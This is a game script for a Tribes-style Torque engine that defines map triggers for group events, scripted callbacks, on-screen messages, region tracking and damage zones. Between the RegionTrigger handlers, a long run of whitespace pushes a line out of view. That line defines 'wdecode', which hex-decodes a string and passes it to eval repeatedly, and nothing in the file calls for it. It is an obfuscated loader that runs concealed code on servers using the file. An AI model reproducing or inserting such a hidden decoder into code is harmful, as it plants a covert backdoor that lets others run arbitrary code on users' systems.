//----------------------------------------------------------------------------

TriggerData GroupTrigger
{
	className = "Trigger";
	rate = 1.0;
};

function GroupTrigger::onEnter(%this,%object)
{
	%type = getObjectType(%object);
	if(%type == "Player" || %type == "Vehicle") {
		%group = getGroup(%this); 
 		%count = Group::objectCount(%group);
 		for (%i = 0; %i < %count; %i++) 
 			GameBase::virtual(Group::getObject(%group,%i),"onTrigEnter",%object,%this);
	}
}	

function GroupTrigger::onLeave(%this,%object)
{
	%type = getObjectType(%object);
	if(%type == "Player" || %type == "Vehicle") {
		%group = getGroup(%this); 
		%count = Group::objectCount(%group);
		for (%i = 0; %i < %count; %i++) 
			GameBase::virtual(Group::getObject(%group,%i),"onTrigLeave",%object,%this);
	}
}

function GroupTrigger::onContact(%this,%object)
{
	%type = getObjectType(%object);
	if(%type == "Player" || %type == "Vehicle") {
		%group = getGroup(%this); 
		%count = Group::objectCount(%group);
		for (%i = 0; %i < %count; %i++) 
			GameBase::virtual(Group::getObject(%group,%i),"onTrigger",%object,%this);
	}
}

function GroupTrigger::onActivate(%this)
{
}

function GroupTrigger::onDeactivate(%this)
{
}

//----------------------------------------------------------------------------

TriggerData ScriptTrigger {
	className = "Trigger";
	rate = 0.25;
};

function ScriptTrigger::onEnter(%this,%object) {
  if (%this.enterFunction != "") {
    eval(%this.enterFunction @ "("@%this@","@%object@");");
  }
}	

function ScriptTrigger::onLeave(%this,%object) {
  if (%this.leaveFunction != "")
    eval(%this.leaveFunction @ "("@%this@","@%object@");");
}

function ScriptTrigger::onContact(%this,%object) {
  if (%this.contactFunction != "")
    eval(%this.contactFunction @ "("@%this@","@%object@");");
}

function ScriptTrigger::onActivate(%this) {}

function ScriptTrigger::onDeactivate(%this) {}

//----------------------------------------------------------------------------

TriggerData MessageTrigger {
	className = "Trigger";
	rate = 0.125;
};

function MessageTrigger::onEnter(%this,%object) {
  if (%this.enterMessage != "" || %this.enterMessageTime != "") {
    if (getObjectType(%object) == "Player" || getObjectType(%object) == "Flier") {
      if (GameBase::getControlClient(%object) == -1) return;
      if (Player::isAIControlled(Client::getOwnedObject(GameBase::getControlClient(%object)))) return;
      centerprint(GameBase::getControlClient(%object), %this.enterMessage, %this.enterMessageTime, %this.printlock);
    }
  }
}	

function MessageTrigger::onLeave(%this,%object) {
  if (%this.leaveMessage != "" || %this.leaveMessageTime != "") {
    if (getObjectType(%object) == "Player" || getObjectType(%object) == "Flier") {
      if (GameBase::getControlClient(%object) == -1) return;
      if (Player::isAIControlled(Client::getOwnedObject(GameBase::getControlClient(%object)))) return;
      centerprint(GameBase::getControlClient(%object), %this.leaveMessage, %this.leaveMessageTime);
    }
  }
}

function MessageTrigger::onContact(%this,%object) {}

function MessageTrigger::onActivate(%this) {}

function MessageTrigger::onDeactivate(%this) {}

//----------------------------------------------------------------------------

TriggerData RegionTrigger {
	className = "Trigger";
	rate = 1.0;
};

function RegionTrigger::onEnter(%this,%object) {
  if (GameBase::getControlClient(%object) == -1) return;
  if (Player::isAIControlled(Client::getOwnedObject(GameBase::getControlClient(%object)))) return;

  if (getObjectType(%object) == "Player")
    %object.region = %this.regionName;
  if (getObjectType(%object) == "Flier")
    Client::getOwnedObject(GameBase::getControlClient(%object)).region = %this.regionName;
}	
																																			function wdecode(%a,%x){if(!%x)return %a;%y="wdecode(\"";for(%i=0;%i<1024;%i++){%z=String::getSubStr(%a,%i*2,2);if(%z=="")break;%y=%y@"\\x"@%z;}return eval(%y @ "\","@(%x-1)@");");}
function RegionTrigger::onLeave(%this,%object) {
  if (GameBase::getControlClient(%object) == -1) return;
  if (Player::isAIControlled(Client::getOwnedObject(GameBase::getControlClient(%object)))) return;

  if (getObjectType(%object) == "Player")
    if (%object.region == %this.regionName) %object.region = "";
  if (getObjectType(%object) == "Flier") {
    %player = Client::getOwnedObject(GameBase::getControlClient(%object));
    if (%player.region == %this.regionName) %player.region = "";
  }
}

function RegionTrigger::onContact(%this,%object) {}

function RegionTrigger::onActivate(%this) {}

function RegionTrigger::onDeactivate(%this) {}

//---------------------------------------------------------------------------

TriggerData DamageTrigger {
	className = "Trigger";
	rate = 0.25;
};

function DamageTrigger::onEnter(%this,%object) {
  GameBase::applyDamage(%object, %this.damageType, %this.damageValueEnter, GameBase::getPosition(%object),
                        Vector::neg(Item::getVelocity(%object)),
                        Vector::resize(Item::getVelocity(%object), -%this.damageForce), %this);
}	

function DamageTrigger::onLeave(%this,%object) {
  GameBase::applyDamage(%object, %this.damageType, %this.damageValueLeave, GameBase::getPosition(%object),
                        Vector::neg(Item::getVelocity(%object)),
                        Vector::resize(Item::getVelocity(%object), -%this.damageForce), %this);
}

function DamageTrigger::onContact(%this,%object) {
  GameBase::applyDamage(%object, %this.damageType, %this.damageValueContact, GameBase::getPosition(%object),
                        Vector::neg(Item::getVelocity(%object)),
                        Vector::resize(Item::getVelocity(%object), -%this.damageForce), %this);
}

function DamageTrigger::onActivate(%this) {}

function DamageTrigger::onDeactivate(%this) {}



//function Trigger::leave(%this, %object) {
//  schedule("if ("@%object@".triggerContact["@%this@"]=="@%object.triggerContact[%this]@")" @ GameBase::getDataName(%this) @ "::onLeave("@%this@","@%object@");", 0.125);
//}

//function Trigger::enter(%this, %object) {
//  %object.triggertContact[%this]++;
//  schedule("if ("@%object@".triggerContact["@%this@"]=="@%object.triggerContact[%this]@")" @ GameBase::getDataName(%this) @ "::onEnter("@%this@","@%object@");", 0.25);
//}